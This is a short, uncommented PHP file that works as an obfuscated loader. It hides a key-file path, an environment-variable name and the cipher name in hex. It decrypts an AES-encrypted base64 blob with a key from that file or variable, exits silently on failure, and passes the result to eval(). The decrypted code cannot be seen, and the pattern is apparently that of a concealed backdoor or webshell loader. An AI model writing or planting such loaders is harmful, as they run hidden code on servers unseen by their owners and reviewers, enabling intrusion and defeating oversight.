<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Diov/jUH/nKsjdz3P6uxTQ==');

$c=base64_decode(

'eQu48Za9jfa5FnTdDtIK5hhLo06fdwG8IGoiPaw7nk9sqE9Hl3bbo5X0HG+gLyZzscrZbvcC8FkD' .
'4NfGd5UKapDMr4eUVgmsnAhwIM8Mhnh+a6P11bERmRgoFXnkzY6YJEAAjKauc9qGf32SsCv8APTR' .
'4DQ5/enPS1sFDRztYntsVXmHe0F4biF4zJLmLzb2sIBP7gDHXBi+444itwpAJQo8TRSEgR+P6azd' .
'RLi3fdrwHWYfTWDaG/Cw2TRtND5AffsSlqOlfWU8ztoJMk07O+VEhiSNrE474UHwdbszdgYYv+LW' .
'uM1gKQ7Ys8adKzNdv6qe+svJzey3hMZmOtFm937KEt1l6TGEZm5PGUZeyl8P5aaqiNh+QpnytTLI' .
'CZaflIuYXO1BHDYPxwrF3Zy5Y0SPadOePzhfWSiTJJsRKZYwwMZ8hSsNEeEKtELA5v5K4U82PhIM' .
'r2qXF4+seS4gIRXQ7Nl3la8VJtCx5Sbz3VSQX0m0MojCJbn32tkn8xAY7U62ezDLA/EO6Eb5EDOu' .
'bP5nMdlLCJ65L1uBHTJy/wD3mJpPfjUKc9ssWvB3eh331gu33IyoAFIfodfT90+27y+sbzuBN3As' .
'VQe6LQRX2wqWpnVpjcvznVhpuLAwpudNNGNtRsdfPkrXRE6WAJsRO8IpDTrC3fqi24L8bPGFcSrr' .
'jTHJ00XNSmL+CCBg31M3w365lHcnOOcTTTtKfruUUw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

